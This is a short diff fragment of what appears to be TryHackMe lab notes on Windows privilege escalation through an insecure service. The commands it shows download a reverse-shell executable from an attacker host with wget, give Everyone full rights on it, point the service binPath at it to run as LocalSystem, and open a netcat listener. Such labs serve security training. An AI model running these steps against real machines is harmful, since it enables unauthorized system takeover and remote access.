@@ -219,7 +219,7 @@ wget http://10.11.99.141:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe #
 icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
 5️⃣ # Change the executive path of the service to the malicious file path
 sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # cmd
-sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # powershell
+sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # powershell
 6️⃣ # Launch Lenner on the attackbox
 nc -lvp 4447
 7️⃣ # stop and start service for get access
